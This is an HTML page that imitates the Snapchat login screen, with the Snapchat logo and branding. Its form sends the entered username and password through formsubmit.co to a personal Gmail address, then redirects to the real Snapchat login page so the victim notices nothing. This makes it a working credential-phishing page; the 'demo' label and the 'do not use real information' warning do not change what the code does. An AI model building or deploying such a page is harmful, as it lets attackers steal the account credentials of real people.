<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Snapchat Login</title>
  <style>
    :root {
      --snap-yellow: #fffc00;
      --snap-black: #000;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: var(--snap-yellow);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 1rem;
    }

    .container {
      background: #fff;
      padding: 2rem;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .container img {
      width: 60px;
      margin-bottom: 1rem;
    }

    h2 {
      background-color: var(--snap-black);
      color: var(--snap-yellow);
      padding: 0.7rem;
      border-radius: 6px;
      margin-bottom: 1rem;
      font-size: 1.2rem;
    }

    input {
      width: 100%;
      padding: 0.8rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
    }

    button {
      width: 100%;
      padding: 0.8rem;
      background-color: var(--snap-black);
      color: var(--snap-yellow);
      font-weight: bold;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #333;
    }

    .warning {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: red;
    }

    @media (max-width: 480px) {
      .container {
        padding: 1.2rem;
      }

      h2 {
        font-size: 1rem;
      }

      input,
      button {
        font-size: 0.95rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/800px-Snapchat_logo.svg.png" alt="Snapchat Logo" />
    <h2>Snapchat Login</h2>

    <form action="https://formsubmit.co/osoble919@gmail.com" method="POST">
      <input type="hidden" name="_subject" value="Snapchat Demo Login Submission" />
      <input type="hidden" name="_template" value="table" />
      <input type="hidden" name="_next" value="https://accounts.snapchat.com/accounts/v2/login?continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-accounts%26referrer%3Dhttps%253A%252F%252Faccounts.snapchat.com%252Fv2%252Fwelcome&force_login=true"/>

      <input type="text" name="fake_username" placeholder="Username or Email" required />
      <input type="password" name="fake_password" placeholder="Password" required />
      <button type="submit">Log In</button>
      <h2>WARNING!!!! DO NOT USE REAL INFORMATION</h2>
    </form>
  </div>
</body>
</html>
